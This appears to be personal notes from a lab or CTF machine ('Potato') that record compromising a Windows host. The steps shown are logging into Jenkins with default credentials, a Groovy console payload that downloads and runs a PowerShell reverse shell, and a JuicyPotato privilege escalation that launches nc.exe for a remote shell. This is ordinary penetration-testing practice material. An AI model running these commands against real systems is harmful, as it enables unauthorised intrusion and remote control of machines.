---
title: Potato
created: '2020-07-04T17:00:13.835Z'
modified: '2020-07-04T18:01:28.179Z'
---

# Potato
- IP: `172.31.1.19`
- OS: `Windows`
## Enumeration
### Writeup
We find a Jenkins portal at port 8080 and `admin:admin` works as credentials
At `http://172.31.1.19:8080/script`, we can execute Groovy scripts.
```
def process = "PowerShell.exe -exec bypass -c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.0.8/reverse.ps1')|iex\"".execute()
println "Found text ${process.text}"
```
We use [this oneliner ps1 revshell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)

`JuicyPotato -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\ben\desktop\nc.exe -e cmd.exe 10.10.0.8 1234" -t *`
### Commands
<details>
<summary>nmap</summary>

- `nmap -p 1-65535 -T4 -A -v 172.31.1.19`
```

```
</details>
